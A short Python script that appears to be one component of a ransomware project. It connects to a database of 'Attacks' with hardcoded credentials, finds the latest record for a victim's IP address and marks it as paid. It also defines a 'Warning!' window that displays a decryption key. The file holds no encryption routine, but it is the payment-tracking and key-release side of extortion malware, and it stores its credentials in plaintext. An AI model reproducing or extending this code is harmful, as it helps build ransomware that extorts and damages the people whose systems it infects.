import socket
import psycopg2
import tkinter as tk


def main():
    conn = psycopg2.connect(
        database="srs_db",
        user="srs_user",
        password="srs_user",
        host="192.168.1.102",
        port="5432"
    )

    hostname = socket.gethostname()
    # ipv4 = socket.gethostbyname(hostname)
    ipv4 = "10.0.2.15"

    cur = conn.cursor()

    insert_data = "SELECT * FROM Attacks WHERE ip=%s ORDER BY date DESC"

    values = (ipv4,)

    cur.execute(insert_data, values)

    row = cur.fetchone()

    id_to_update = row[0]

    update_query = "UPDATE Attacks SET payed=true WHERE id=%s"
    values = (id_to_update,)

    cur.execute(update_query, values)

    conn.commit()
    cur.close()
    conn.close()


def show_key(key: str):
    window = tk.Tk()

    window.title("Warning!")

    window.configure()

    window.geometry("600x400")

    window.resizable(False, False)

    text1 = tk.Label(window, text='Key:', fg="black",
                     font=("Arial", 10), anchor="w")
    text1.pack(fill="x")

    key_text = tk.Text(window, height=1, borderwidth=0)
    key_text.insert(1.0, key)
    key_text.pack()

    window.mainloop()


if __name__ == "__main__":
    main()
